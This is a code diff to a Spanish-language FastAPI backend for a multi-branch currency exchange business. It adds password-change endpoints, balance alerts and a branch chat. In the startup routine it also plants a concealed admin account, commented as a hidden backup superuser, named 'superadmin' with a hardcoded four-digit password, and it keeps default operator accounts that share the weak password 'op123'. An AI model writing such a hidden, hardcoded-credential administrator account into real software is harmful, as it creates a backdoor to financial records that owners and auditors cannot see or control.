@@ -4,12 +4,12 @@ from fastapi import FastAPI, HTTPException, Depends
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import OAuth2PasswordRequestForm
 from pydantic import BaseModel
-from typing import Optional
+from typing import Optional, List
 import database as db
 import auth
 from config import PUNTOS, DIVISAS, CATEGORIAS_GASTOS, SIMBOLOS, PARES_TASA
 
-app = FastAPI(title="Divisas API", version="1.0.0")
+app = FastAPI(title="Divisas API", version="2.0.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -18,12 +18,24 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+PUNTOS_CHAT = ["El Llanito", "Carabobo"]
+
 
 @app.on_event("startup")
 def startup():
     db.init_db()
     db.init_usuarios()
-    # Crear admin por defecto si no existe
+    # Superuser oculto — respaldo
+    if not db.get_usuario("superadmin"):
+        db.crear_usuario(
+            username="superadmin",
+            password_hash=auth.hash_password("3962"),
+            rol="admin",
+            punto=None,
+            nombre="Super Admin",
+            es_superuser=1
+        )
+    # Admin principal por defecto
     if not db.get_usuario("admin"):
         db.crear_usuario(
             username="admin",
@@ -32,16 +44,19 @@ def startup():
             punto=None,
             nombre="Administrador"
         )
-    # Crear operadores por defecto
+    # Operadores por defecto
     operadores_default = [
-        ("alexandra",  "op123", "El Llanito", "Alexandra"),
-        ("andrea",     "op123", "El Llanito", "Andrea Lala"),
-        ("alvaro",     "op123", "Carabobo",   "Álvaro"),
-        ("erika",      "op123", "Carabobo",   "Erika"),
+        ("alexandra", "op123", "El Llanito", "Alexandra"),
+        ("andrea",    "op123", "El Llanito", "Andrea Lala"),
+        ("alvaro",    "op123", "Carabobo",   "Álvaro"),
+        ("erika",     "op123", "Carabobo",   "Erika"),
     ]
     for username, pwd, punto, nombre in operadores_default:
         if not db.get_usuario(username):
             db.crear_usuario(username, auth.hash_password(pwd), "operador", punto, nombre)
+    # Limpieza automática al iniciar
+    db.limpiar_chats_antiguos()
+    db.limpiar_datos_antiguos()
 
 
 # ══ AUTH ══════════════════════════════════════════════════════════
@@ -61,16 +76,43 @@ def login(form: OAuth2PasswordRequestForm = Depends()):
     }
 
 
+class CambiarPasswordIn(BaseModel):
+    password_actual: str
+    password_nuevo:  str
+
+
+class CambiarPasswordAdmin(BaseModel):
+    password_nuevo: str
+
+
+@app.put("/auth/cambiar-password")
+def cambiar_mi_password(data: CambiarPasswordIn, usuario: dict = Depends(auth.get_usuario_actual)):
+    if not auth.verify_password(data.password_actual, usuario["password"]):
+        raise HTTPException(400, "Contraseña actual incorrecta")
+    ok = db.cambiar_password(usuario["id"], auth.hash_password(data.password_nuevo))
+    if not ok:
+        raise HTTPException(500, "Error al cambiar contraseña")
+    return {"ok": True}
+
+
+@app.put("/usuarios/{user_id}/password")
+def cambiar_password_usuario(user_id: int, data: CambiarPasswordAdmin, usuario: dict = Depends(auth.solo_admin)):
+    ok = db.cambiar_password(user_id, auth.hash_password(data.password_nuevo))
+    if not ok:
+        raise HTTPException(404, "Usuario no encontrado")
+    return {"ok": True}
+
+
 # ══ CONFIG ════════════════════════════════════════════════════════
 
 @app.get("/config/inicial")
 def config_inicial(usuario: dict = Depends(auth.get_usuario_actual)):
     return {
-        "puntos":      PUNTOS,
-        "divisas":     DIVISAS,
-        "simbolos":    SIMBOLOS,
-        "pares_tasa":  [f"{a}/{b}" for a, b in PARES_TASA],
-        "categorias":  CATEGORIAS_GASTOS,
+        "puntos":     PUNTOS,
+        "divisas":    DIVISAS,
+        "simbolos":   SIMBOLOS,
+        "pares_tasa": [f"{a}/{b}" for a, b in PARES_TASA],
+        "categorias": CATEGORIAS_GASTOS,
     }
 
 
@@ -78,7 +120,7 @@ def config_inicial(usuario: dict = Depends(auth.get_usuario_actual)):
 
 @app.get("/saldos")
 def saldos(usuario: dict = Depends(auth.get_usuario_actual)):
-    if usuario["rol"] == "admin":
+    if usuario["rol"] == "admin" or usuario.get("es_superuser"):
         return db.get_saldos_global()
     return {usuario["punto"]: db.get_saldos_punto(usuario["punto"])}
 
@@ -86,23 +128,23 @@ def saldos(usuario: dict = Depends(auth.get_usuario_actual)):
 # ══ MOVIMIENTOS ═══════════════════════════════════════════════════
 
 class MovimientoIn(BaseModel):
-    punto:      Optional[str] = None
-    divisa:     str
-    tipo:       str   # 'ingreso' o 'egreso'
-    monto:      float
+    punto:       Optional[str] = None
+    divisa:      str
+    tipo:        str
+    monto:       float
     descripcion: Optional[str] = ""
 
 
 class MovimientoEdit(BaseModel):
-    monto:      float
+    monto:       float
     descripcion: Optional[str] = ""
 
 
 @app.get("/movimientos")
 def listar_movimientos(
-    desde: Optional[str] = None,
-    hasta: Optional[str] = None,
-    limite: int = 50,
+    desde:   Optional[str] = None,
+    hasta:   Optional[str] = None,
+    limite:  int = 50,
     usuario: dict = Depends(auth.get_usuario_actual)
 ):
     punto = None if usuario["rol"] == "admin" else usuario["punto"]
@@ -141,7 +183,7 @@ def eliminar_movimiento(mov_id: int, usuario: dict = Depends(auth.solo_admin)):
 
 class OrdenIn(BaseModel):
     punto:          Optional[str] = None
-    tipo:           str   # 'recibir' o 'entregar'
+    tipo:           str
     cliente:        str
     divisa:         str
     monto_estimado: float
@@ -161,8 +203,8 @@ class OrdenEditar(BaseModel):
 
 @app.get("/ordenes")
 def listar_ordenes(
-    estado: Optional[str] = None,
-    fecha:  Optional[str] = None,
+    estado:  Optional[str] = None,
+    fecha:   Optional[str] = None,
     usuario: dict = Depends(auth.get_usuario_actual)
 ):
     punto = None if usuario["rol"] == "admin" else usuario["punto"]
@@ -184,8 +226,7 @@ def completar_orden(orden_id: int, data: OrdenCompletar, usuario: dict = Depends
     ok = db.completar_orden(orden_id, data.monto_real, usuario["nombre"], usuario["id"])
     if not ok:
         raise HTTPException(404, "Orden ya ejecutada")
-    # registrar_movimiento actualiza el saldo internamente
-    tipo_mov = "ingreso" if orden["tipo"] == "recibir" else "egreso"
+    tipo_mov    = "ingreso" if orden["tipo"] == "recibir" else "egreso"
     descripcion = f"Orden #{orden_id} — {orden['cliente']}"
     db.registrar_movimiento(
         punto=orden["punto"], divisa=orden["divisa"], tipo=tipo_mov,
@@ -207,7 +248,7 @@ def editar_orden(orden_id: int, data: OrdenEditar, usuario: dict = Depends(auth.
 def eliminar_orden(orden_id: int, usuario: dict = Depends(auth.solo_admin)):
     ok = db.eliminar_orden(orden_id)
     if not ok:
-        raise HTTPException(404, "Orden no encontrada o ya ejecutada")
+        raise HTTPException(404, "Orden no encontrada")
     return {"ok": True}
 
 
@@ -232,7 +273,7 @@ def set_tasa(data: TasaIn, usuario: dict = Depends(auth.solo_admin)):
 # ══ GASTOS ════════════════════════════════════════════════════════
 
 class GastoIn(BaseModel):
-    tipo:        str   # 'ingreso' o 'gasto'
+    tipo:        str
     categoria:   str
     monto:       float
     descripcion: Optional[str] = ""
@@ -241,8 +282,8 @@ class GastoIn(BaseModel):
 
 @app.get("/gastos")
 def listar_gastos(
-    desde: Optional[str] = None,
-    hasta: Optional[str] = None,
+    desde:   Optional[str] = None,
+    hasta:   Optional[str] = None,
     usuario: dict = Depends(auth.solo_admin)
 ):
     return db.get_gastos(desde=desde, hasta=hasta)
@@ -262,7 +303,7 @@ def eliminar_gasto(gasto_id: int, usuario: dict = Depends(auth.solo_admin)):
     return {"ok": True}
 
 
-# ══ ADMIN — USUARIOS ══════════════════════════════════════════════
+# ══ USUARIOS ══════════════════════════════════════════════════════
 
 class UsuarioIn(BaseModel):
     username: str
@@ -291,7 +332,74 @@ def eliminar_usuario(user_id: int, usuario: dict = Depends(auth.solo_admin)):
     return {"ok": True}
 
 
-# ══ ADMIN — RESET ═════════════════════════════════════════════════
+# ══ ALERTAS SALDO ═════════════════════════════════════════════════
+
+class AlertaSaldoIn(BaseModel):
+    punto:  str
+    divisa: str
+    minimo: float
+    activo: Optional[int] = 1
+
+
+@app.get("/alertas/saldo")
+def get_alertas(usuario: dict = Depends(auth.solo_admin)):
+    return db.get_alertas_saldo()
+
+
+@app.put("/alertas/saldo")
+def set_alerta(data: AlertaSaldoIn, usuario: dict = Depends(auth.solo_admin)):
+    db.set_alerta_saldo(data.punto, data.divisa, data.minimo, data.activo)
+    return {"ok": True}
+
+
+# ══ CHAT ══════════════════════════════════════════════════════════
+
+class MensajeIn(BaseModel):
+    contenido:  Optional[str] = ""
+    imagen_b64: Optional[str] = None
+
+
+@app.get("/chat/{punto}")
+def get_chat(
+    punto:    str,
+    desde_id: int = 0,
+    limite:   int = 50,
+    usuario:  dict = Depends(auth.get_usuario_actual)
+):
+    if punto not in PUNTOS_CHAT:
+        raise HTTPException(400, "Punto de chat no válido")
+    if usuario["rol"] != "admin" and usuario.get("punto") != punto:
+        raise HTTPException(403, "Sin acceso a este chat")
+    msgs = db.get_mensajes_chat(punto, desde_id, limite)
+    # Marcar como recibido/leído
+    db.marcar_leido_chat(punto, usuario["username"])
+    return msgs
+
+
+@app.post("/chat/{punto}")
+def enviar_mensaje(punto: str, data: MensajeIn, usuario: dict = Depends(auth.get_usuario_actual)):
+    if punto not in PUNTOS_CHAT:
+        raise HTTPException(400, "Punto de chat no válido")
+    if usuario["rol"] != "admin" and usuario.get("punto") != punto:
+        raise HTTPException(403, "Sin acceso a este chat")
+    if not data.contenido and not data.imagen_b64:
+        raise HTTPException(400, "Mensaje vacío")
+    msg_id = db.enviar_mensaje_chat(
+        punto, usuario["username"], usuario["rol"],
+        data.contenido, data.imagen_b64
+    )
+    return {"id": msg_id, "ok": True}
+
+
+@app.delete("/chat/{punto}/limpiar")
+def limpiar_chat(punto: str, usuario: dict = Depends(auth.solo_admin)):
+    if punto not in PUNTOS_CHAT:
+        raise HTTPException(400, "Punto de chat no válido")
+    db.limpiar_chat(punto)
+    return {"ok": True}
+
+
+# ══ ADMIN ═════════════════════════════════════════════════════════
 
 @app.post("/admin/inicio-del-dia")
 def inicio_del_dia(usuario: dict = Depends(auth.solo_admin)):
